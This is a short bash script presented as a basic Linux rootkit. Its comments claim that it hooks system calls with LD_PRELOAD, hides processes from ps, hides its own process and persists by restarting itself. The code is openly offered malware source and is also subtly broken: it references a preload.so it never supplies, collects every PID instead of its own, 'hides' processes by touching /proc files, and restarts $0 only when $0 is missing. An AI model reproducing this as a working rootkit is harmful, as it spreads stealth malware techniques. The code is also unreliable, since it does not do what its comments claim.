#!/bin/bash

# This is a basic example of a Linux rootkit written in bash.
# It hooks system calls, filters process lists, hides its own process, and persists.

# Hooking: Use LD_PRELOAD to intercept library functions
export LD_PRELOAD=$PWD/preload.so

# Filtering: Hide processes from the ps command
ps_hider() {
    # Create a temporary file for storing the list of hidden PIDs
    TEMP_FILE=$(mktemp)

    # List all running processes (excluding the current shell process PID)
    pids=$(ps -eo pid | grep -v $$)

    # Loop through each PID and add it to the temp file
    echo "$pids" > $TEMP_FILE

    # Override /proc/PID/cmdline with empty files for hidden PIDs
    while read -r pid; do
        touch "/proc/$pid/cmdline"
    done < $TEMP_FILE
    
    # Clean up temporary file after hiding processes
    rm $TEMP_FILE
}

# Hiding: Remove the rootkit's process from the list before passing it back
ps_hider

# Persistence: Monitor system files and automatically restore itself if its components are deleted
while true; do
    if [ ! -f "$0" ] || [ ! -f "preload.so" ]; then
        # Restore the rootkit if any of its components are deleted
        $0 &
        exit 0
    fi
    sleep 10
done
